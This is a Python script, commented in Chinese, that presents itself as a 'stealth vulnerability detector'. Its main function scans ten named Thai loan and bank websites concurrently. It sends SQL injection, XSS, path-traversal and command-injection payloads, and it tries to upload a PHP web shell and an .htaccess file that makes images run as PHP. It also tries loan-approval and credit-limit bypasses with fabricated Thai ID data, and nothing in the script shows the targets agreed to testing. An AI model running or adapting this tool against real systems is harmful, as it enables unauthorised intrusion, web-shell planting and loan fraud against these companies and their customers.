#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国贷款系统高级隐蔽漏洞检测器 - 修复版
Thai Loan System Advanced Stealth Vulnerability Detector - Fixed Version

专门检测泰国小额贷款公司的隐蔽漏洞和深层安全问题
包含高级绕过技术和智能漏洞识别
"""

import requests
import json
import time
import random
import string
import hashlib
import base64
import re
import concurrent.futures
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
import threading
from threading import Lock
import warnings
warnings.filterwarnings('ignore')

class ThaiLoanStealthVulnDetector:
    """泰国贷款系统隐蔽漏洞检测器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        self.results = []
        self.lock = Lock()
        self.stealth_payloads = self._generate_stealth_payloads()
        self.thai_loan_context = self._load_thai_context()

    def _generate_stealth_payloads(self):
        """生成隐蔽攻击载荷"""
        return {
            "sqli_advanced": [
                "' AND (SELECT SUBSTRING(@@version,1,1))='5' AND '1'='1",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' OR 1=1#",
                "' OR 'a'='a",
                "1' OR 1=1-- ",
                "admin'--",
                "admin'/*",
                "' OR 1=1-- \"",
                "' OR 1=1-- #",
                "') OR 1=1-- ",
                "') OR ('1'='1-- ",
                "1' UNION SELECT database(),user(),version(),4,5,6,7,8,9,10--",
                "1' UNION SELECT @@version,@@datadir,3,4,5,6,7,8,9,10--"
            ],
            "xss_advanced": [
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload=alert('XSS')>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<script>alert('XSS')</script>",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "<script>String.fromCharCode(88,83,83)</script>",
                "<img src=x onerror=eval(String.fromCharCode(88,83,83))>",
                "<svg><script>alert('XSS')</script></svg>",
                "javascript:alert('XSS')",
                "<object data=\"javascript:alert('XSS')\"></object>",
                "<embed src=\"javascript:alert('XSS')\"></embed>",
                "<applet code=\"javascript:alert('XSS')\"></applet>",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
            ],
            "file_upload": [
                {"name": "test.php", "content": "<?php phpinfo(); ?>", "type": "application/x-php"},
                {"name": "shell.php", "content": "<?php system($_GET['cmd']); ?>", "type": "application/x-php"},
                {"name": "test.html", "content": "<script>alert('XSS')</script>", "type": "text/html"},
                {"name": "test.js", "content": "alert('XSS');", "type": "application/javascript"},
                {"name": ".htaccess", "content": "AddType application/x-httpd-php .jpg", "type": "text/plain"}
            ],
            "lfi_payloads": [
                "../../../../../../etc/passwd",
                "../../../etc/passwd",
                "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "file:///etc/passwd",
                "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                "expect://id",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
            ],
            "rce_payloads": [
                ";id",
                "|id",
                "&id",
                ";whoami",
                "|whoami",
                "&whoami",
                ";ls -la",
                "|ls -la",
                "&ls -la",
                "&& whoami",
                "|| whoami",
                "`whoami`",
                "$(whoami)"
            ]
        }

    def _load_thai_context(self):
        """加载泰国贷款系统上下文信息"""
        return {
            "thai_names": [
                "สมชาย", "สมศรี", "นายสมชาย ใจดี", "นางสาวสมศรี รักดี",
                "วิชัย", "มานี", "สมศักดิ์", "นางสาวมานี มีใจ", "นายวิชัย แข็งแกร่ง",
                "ปรีชา", "กนกวรรณ", "สุรชัย", "ดารา", "อนุชิต", "พิไลวรรณ"
            ],
            "thai_ids": [
                "1103700123456", "2104500234567", "3105200345678", "4106900456789",
                "5107700567890", "6108800678901", "7109900789012", "8111000890123"
            ],
            "thai_phones": [
                "0812345678", "0823456789", "0834567890", "0845678901",
                "0856789012", "0867890123", "0878901234", "0889012345",
                "0890123456", "0901234567", "0912345678", "0923456789"
            ],
            "loan_amounts": [
                "5000", "10000", "15000", "20000", "25000", "30000",
                "35000", "40000", "45000", "50000", "75000", "100000"
            ],
            "loan_terms": ["3", "6", "9", "12", "18", "24"],
            "thai_addresses": [
                "กรุงเทพมหานคร", "เชียงใหม่", "ภูเก็ต", "พัทยา", "หาดใหญ่",
                "นนทบุรี", "ปทุมธานี", "สมุทรปราการ", "ชลบุรี", "ระยอง"
            ]
        }

    def _generate_thai_test_data(self):
        """生成泰国化测试数据"""
        return {
            "name": random.choice(self.thai_loan_context["thai_names"]),
            "thai_id": random.choice(self.thai_loan_context["thai_ids"]),
            "phone": random.choice(self.thai_loan_context["thai_phones"]),
            "email": f"test{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com",
            "loan_amount": random.choice(self.thai_loan_context["loan_amounts"]),
            "loan_term": random.choice(self.thai_loan_context["loan_terms"]),
            "address": random.choice(self.thai_loan_context["thai_addresses"]),
            "occupation": "พนักงานบริษัท",
            "monthly_income": "15000",
            "bank_name": "ธนาคารกรุงเทพ",
            "bank_account": "1234567890"
        }

    def detect_advanced_sqli(self, url, form_data=None):
        """检测高级SQL注入漏洞"""
        vulnerabilities = []

        # 测试所有SQL注入载荷
        for payload in self.stealth_payloads["sqli_advanced"]:
            try:
                if form_data:
                    # 测试表单POST请求
                    test_data = form_data.copy()
                    for field in test_data:
                        if isinstance(test_data[field], str):
                            test_data[field] = payload
                            response = self.session.post(url, data=test_data, timeout=10)

                            # 检查SQL错误
                            sql_errors = [
                                "mysql_fetch", "mysql_num_rows", "mysql_query",
                                "ora-", "microsoft ole db provider", "odbc drivers error",
                                "postgresql query failed", "warning: pg", "valid postgresql result",
                                "sqlite_", "sql syntax", "unclosed quotation mark",
                                "activex data object", "adodb.field", "bof or eof",
                                "sqljdbc", "jtds", "oracle driver"
                            ]

                            for error in sql_errors:
                                if error.lower() in response.text.lower():
                                    vulnerabilities.append({
                                        "type": "Advanced SQL Injection",
                                        "url": url,
                                        "payload": payload,
                                        "method": "POST",
                                        "error": error,
                                        "evidence": response.text[:500]
                                    })
                                    break
                else:
                    # 测试GET请求
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=10)

                    sql_errors = [
                        "mysql_fetch", "mysql_num_rows", "mysql_query",
                        "ora-", "microsoft ole db provider", "odbc drivers error",
                        "postgresql query failed", "warning: pg", "valid postgresql result",
                        "sqlite_", "sql syntax", "unclosed quotation mark"
                    ]

                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerabilities.append({
                                "type": "Advanced SQL Injection",
                                "url": test_url,
                                "payload": payload,
                                "method": "GET",
                                "error": error,
                                "evidence": response.text[:500]
                            })
                            break

            except Exception as e:
                continue

        return vulnerabilities

    def detect_advanced_xss(self, url, form_data=None):
        """检测高级XSS漏洞"""
        vulnerabilities = []

        for payload in self.stealth_payloads["xss_advanced"]:
            try:
                if form_data:
                    test_data = form_data.copy()
                    for field in test_data:
                        if isinstance(test_data[field], str):
                            test_data[field] = payload
                            response = self.session.post(url, data=test_data, timeout=10)

                            if payload in response.text or "alert('XSS')" in response.text:
                                vulnerabilities.append({
                                    "type": "Advanced XSS",
                                    "url": url,
                                    "payload": payload,
                                    "method": "POST",
                                    "evidence": response.text[:500]
                                })
                else:
                    test_url = f"{url}?search={quote(payload)}"
                    response = self.session.get(test_url, timeout=10)

                    if payload in response.text or "alert('XSS')" in response.text:
                        vulnerabilities.append({
                            "type": "Advanced XSS",
                            "url": test_url,
                            "payload": payload,
                            "method": "GET",
                            "evidence": response.text[:500]
                        })

            except Exception as e:
                continue

        return vulnerabilities

    def detect_file_upload_vulns(self, url):
        """检测文件上传漏洞"""
        vulnerabilities = []

        for file_info in self.stealth_payloads["file_upload"]:
            try:
                files = {
                    'file': (file_info["name"], file_info["content"], file_info["type"]),
                    'submit': ('', 'Upload')
                }

                response = self.session.post(url, files=files, timeout=10)

                # 检查上传是否成功
                if response.status_code == 200 and ("upload" in response.text.lower() or "success" in response.text.lower()):
                    vulnerabilities.append({
                        "type": "File Upload Vulnerability",
                        "url": url,
                        "payload": file_info["name"],
                        "evidence": response.text[:500]
                    })

            except Exception as e:
                continue

        return vulnerabilities

    def discover_api_endpoints(self, base_url):
        """发现API端点"""
        discovered_endpoints = []

        api_patterns = [
            "/api/v1/", "/api/v2/", "/api/", "/rest/api/", "/mobile/api/",
            "/app/api/", "/web/api/", "/admin/api/", "/backend/api/"
        ]

        endpoint_paths = [
            "users", "customers", "clients", "accounts", "loans", "applications",
            "transactions", "payments", "auth", "login", "register", "apply",
            "status", "balance", "transfer", "deposit", "withdraw", "profile"
        ]

        for pattern in api_patterns:
            for path in endpoint_paths:
                test_url = urljoin(base_url, f"{pattern}{path}")
                try:
                    response = self.session.get(test_url, timeout=5)
                    if response.status_code == 200:
                        discovered_endpoints.append({
                            "url": test_url,
                            "status": response.status_code,
                            "length": len(response.text),
                            "content_type": response.headers.get("content-type", "")
                        })
                except:
                    continue

        return discovered_endpoints

    def test_business_logic_flaws(self, base_url):
        """测试业务逻辑漏洞"""
        vulnerabilities = []

        # 测试贷款申请逻辑绕过
        test_data = self._generate_thai_test_data()

        # 修改数据进行业务逻辑测试
        business_logic_tests = [
            {
                "name": "Loan Amount Manipulation",
                "modifications": {"loan_amount": "999999999", "loan_term": "360"}
            },
            {
                "name": "Interest Rate Bypass",
                "modifications": {"interest_rate": "0.01", "special_promotion": "TRUE"}
            },
            {
                "name": "Credit Limit Override",
                "modifications": {"credit_limit": "10000000", "credit_score": "999"}
            },
            {
                "name": "Approval Bypass",
                "modifications": {"auto_approve": "true", "manual_review": "false"}
            }
        ]

        for test in business_logic_tests:
            try:
                test_application = test_data.copy()
                test_application.update(test["modifications"])

                # 寻找申请端点
                application_urls = [
                    urljoin(base_url, "/api/loan/application"),
                    urljoin(base_url, "/apply"),
                    urljoin(base_url, "/loan-application"),
                    urljoin(base_url, "/api/apply")
                ]

                for url in application_urls:
                    response = self.session.post(url, data=test_application, timeout=10)

                    if response.status_code == 200 and (
                        "approved" in response.text.lower() or
                        "success" in response.text.lower() or
                        "accepted" in response.text.lower()
                    ):
                        vulnerabilities.append({
                            "type": "Business Logic Flaw",
                            "url": url,
                            "test_name": test["name"],
                            "payload": test_application,
                            "evidence": response.text[:500]
                        })

            except Exception as e:
                continue

        return vulnerabilities

    def comprehensive_scan(self, target_info):
        """对目标进行综合扫描"""
        target_name = target_info["name"]
        target_url = target_info["url"]

        print(f"\n开始深度扫描: {target_name}")
        print(f"URL: {target_url}")

        scan_result = {
            "target": target_name,
            "url": target_url,
            "scan_time": datetime.now().isoformat(),
            "vulnerabilities": [],
            "api_endpoints": [],
            "scan_status": "completed"
        }

        # 1. 发现API端点
        print("  发现API端点...")
        api_endpoints = self.discover_api_endpoints(target_url)
        scan_result["api_endpoints"] = api_endpoints

        # 2. 测试SQL注入
        print("  测试SQL注入...")
        sqli_vulns = self.detect_advanced_sqli(target_url)
        scan_result["vulnerabilities"].extend(sqli_vulns)

        # 3. 测试XSS
        print("  测试XSS...")
        xss_vulns = self.detect_advanced_xss(target_url)
        scan_result["vulnerabilities"].extend(xss_vulns)

        # 4. 测试文件上传漏洞
        print("  测试文件上传...")
        upload_vulns = self.detect_file_upload_vulns(urljoin(target_url, "/upload"))
        scan_result["vulnerabilities"].extend(upload_vulns)

        # 5. 测试业务逻辑漏洞
        print("  测试业务逻辑漏洞...")
        logic_vulns = self.test_business_logic_flaws(target_url)
        scan_result["vulnerabilities"].extend(logic_vulns)

        # 测试发现的API端点
        for endpoint in api_endpoints:
            try:
                print(f"  测试API端点: {endpoint['url']}")
                # 对API端点进行SQL注入和XSS测试
                test_data = self._generate_thai_test_data()

                sqli_api_vulns = self.detect_advanced_sqli(endpoint["url"], test_data)
                xss_api_vulns = self.detect_advanced_xss(endpoint["url"], test_data)

                scan_result["vulnerabilities"].extend(sqli_api_vulns)
                scan_result["vulnerabilities"].extend(xss_api_vulns)

            except Exception as e:
                continue

        vulnerability_count = len(scan_result["vulnerabilities"])
        print(f"扫描完成: 发现 {vulnerability_count} 个潜在漏洞")

        return scan_result

def main():
    """主函数"""
    print("泰国贷款系统高级隐蔽漏洞检测器")
    print("=" * 60)

    # 扩展的泰国贷款目标列表
    thai_loan_targets = [
        {"name": "MoneyCat Thailand", "url": "https://www.moneycat.co.th"},
        {"name": "Mula-X", "url": "https://mula-x.com"},
        {"name": "Rocket Cash", "url": "https://www.rocket-cash.com"},
        {"name": "KLoan Thailand", "url": "https://kloan.co.th"},
        {"name": "NgoenMun Finance", "url": "https://ngoenmun.com"},
        {"name": "Peacoop Credit Union", "url": "https://peacoop.or.th"},
        {"name": "Ngern Tid Lor", "url": "https://www.ngerntidlor.com"},
        {"name": "SME Bank", "url": "https://www.smebank.co.th"},
        {"name": "Gcapital", "url": "https://www.gcapital.co.th"},
        {"name": "J Ventures", "url": "https://www.jventures.co.th"}
    ]

    start_time = time.time()
    all_results = []

    print(f"开始对 {len(thai_loan_targets)} 个泰国贷款目标进行深度扫描...\n")

    # 使用线程池进行并发扫描
    detector = ThaiLoanStealthVulnDetector()

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(detector.comprehensive_scan, target) for target in thai_loan_targets]

        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                all_results.append(result)
            except Exception as e:
                print(f"扫描失败: {str(e)}")

    # 生成详细报告
    end_time = time.time()
    duration = end_time - start_time

    total_vulnerabilities = sum(len(result["vulnerabilities"]) for result in all_results)
    total_api_endpoints = sum(len(result["api_endpoints"]) for result in all_results)

    print("\n" + "=" * 60)
    print("深度扫描完成!")
    print(f"扫描时长: {duration:.2f} 秒")
    print(f"目标总数: {len(thai_loan_targets)}")
    print(f"发现漏洞总数: {total_vulnerabilities}")
    print(f"发现API端点总数: {total_api_endpoints}")

    print("\n详细结果:")
    for result in all_results:
        print(f"\n{result['target']}:")
        print(f"  URL: {result['url']}")
        print(f"  漏洞数量: {len(result['vulnerabilities'])}")
        print(f"  API端点: {len(result['api_endpoints'])}")

        if result['vulnerabilities']:
            print("  发现的漏洞:")
            for vuln in result['vulnerabilities'][:5]:  # 只显示前5个
                print(f"    - {vuln['type']}: {vuln.get('payload', 'N/A')}")

        if result['api_endpoints']:
            print("  发现的API端点:")
            for endpoint in result['api_endpoints'][:3]:  # 只显示前3个
                print(f"    - {endpoint['url']} (状态: {endpoint['status']})")

    # 保存详细报告
    report_data = {
        "scan_info": {
            "scan_time": datetime.now().isoformat(),
            "duration_seconds": duration,
            "targets_tested": len(thai_loan_targets),
            "total_vulnerabilities": total_vulnerabilities,
            "total_api_endpoints": total_api_endpoints
        },
        "results": all_results,
        "summary": {
            "most_vulnerable_targets": sorted(
                all_results,
                key=lambda x: len(x['vulnerabilities']),
                reverse=True
            )[:5],
            "most_active_endpoints": sorted(
                [endpoint for result in all_results for endpoint in result['api_endpoints']],
                key=lambda x: x['length'],
                reverse=True
            )[:10]
        }
    }

    report_file = f"thai_loan_stealth_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report_data, f, ensure_ascii=False, indent=2)

    print(f"\n详细报告已保存到: {report_file}")

    if total_vulnerabilities > 0:
        print(f"\n发现 {total_vulnerabilities} 个潜在安全漏洞，建议立即进行详细验证！")
    else:
        print("\n未发现明显的安全漏洞，但建议进行更深入的渗透测试。")

if __name__ == "__main__":
    main()